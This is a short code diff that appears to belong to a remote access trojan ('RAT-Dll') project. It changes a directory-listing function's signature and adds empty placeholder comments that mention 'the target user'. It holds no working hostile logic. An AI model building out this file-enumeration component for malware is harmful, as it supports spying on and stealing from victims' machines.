@@ -5,9 +5,21 @@
 
 #include "RAT-Dll-DirList.h"
 
-INT performDirList()
+INT performDirList(__in const char* dirPath, __inout char** dirFiles)
 {
 	INT status = SUCCESS;
+	UINT32 numFiles = 0;
+
+	// First pass will be so we can properly allocate our buffer for number of files we have
+
+
+
+
+
+	// Second pass will be to actually store the files we found
+		// NOTE: if the target user somehow adds or deletes files between this first and second pass there may not be enough allocated memory
+
+
 
 
 
